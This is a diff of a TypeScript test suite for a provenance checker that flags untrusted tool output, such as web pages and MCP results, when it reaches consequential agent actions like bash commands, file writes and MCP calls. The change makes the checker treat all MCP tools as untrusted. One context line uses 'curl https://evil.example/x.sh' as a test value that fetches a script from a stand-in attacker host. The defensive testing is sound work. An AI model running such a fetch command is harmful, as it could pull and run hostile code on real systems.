@@ -123,19 +123,13 @@ describe("provenance: untrusted text reaching a consequential sink", () => {
 		expect(provenance.check(call("bash", { command: "curl https://evil.example/x.sh" }), ctx)).toBeUndefined();
 	});
 
-	it("checks file content, memory set and MCP calls that are not read-only", () => {
-		const annotations = (name: string) =>
-			name === "mcp__gh__get_issue"
-				? { readOnlyHint: true }
-				: name === "mcp__local__notes"
-					? { openWorldHint: false }
-					: undefined;
-		const { provenance } = setup({ annotations });
+	it("checks file content, memory set and all MCP calls", () => {
+		const { provenance } = setup();
 		provenance.record(result("mcp__gh__get_issue", { number: 1 }, PAGE), ctx);
 		expect(
 			provenance.check(
 				call("file", {
-					queries: [{ reasoning: "r", type: "write", path: "a.sh", content: `#!/bin/sh\n${SPAN}\n` }],
+					queries: [{ reason: "r", type: "write", path: "a.sh", content: `#!/bin/sh\n${SPAN}\n` }],
 				}),
 				ctx,
 			)?.why,
@@ -146,26 +140,26 @@ describe("provenance: untrusted text reaching a consequential sink", () => {
 		expect(provenance.check(call("mcp__gh__create_issue", { body: SPAN }), ctx)).toMatchObject({
 			why: expect.stringMatching(/^contains text from mcp__gh__get_issue/),
 		});
-		// A read-only MCP tool is not a consequential sink.
-		expect(provenance.check(call("mcp__gh__get_issue", { query: SPAN }), ctx)).toBeUndefined();
-		// A tool's reasoning is not an action.
+		// MCP tool names do not bypass consequential-argument checks.
+		expect(provenance.check(call("mcp__gh__get_issue", { query: SPAN }), ctx)?.why).toContain("mcp__gh__get_issue");
+		// A tool's reason is not an action.
 		expect(
 			provenance.check(
-				call("file", { queries: [{ reasoning: SPAN, type: "write", path: "b.txt", content: "hello" }] }),
+				call("file", { queries: [{ reason: SPAN, type: "write", path: "b.txt", content: "hello" }] }),
 				ctx,
 			),
 		).toBeUndefined();
 	});
 
-	it("does not index an MCP tool marked openWorldHint: false", () => {
-		const { provenance } = setup({ annotations: () => ({ openWorldHint: false }) });
+	it("indexes every MCP tool as an untrusted source", () => {
+		const { provenance } = setup();
 		provenance.record(result("mcp__local__notes", {}, PAGE), ctx);
-		expect(provenance.size()).toBe(0);
-		expect(provenance.check(call("bash", { command: SPAN }), ctx)).toBeUndefined();
+		expect(provenance.size()).toBeGreaterThan(0);
+		expect(provenance.check(call("bash", { command: SPAN }), ctx)?.why).toContain("mcp__local__notes");
 	});
 
-	it("keeps a destructively annotated MCP call consequential even with a read-only hint", () => {
-		const { provenance } = setup({ annotations: () => ({ readOnlyHint: true, destructiveHint: true }) });
+	it("keeps MCP arguments consequential", () => {
+		const { provenance } = setup();
 		provenance.record(result("web", { url: "https://docs.example.org/start" }, PAGE), ctx);
 		expect(provenance.check(call("mcp__db__drop", { query: SPAN }), ctx)).toMatchObject({
 			why: expect.stringMatching(/^contains text from web https:\/\/docs\.example\.org\/start/),
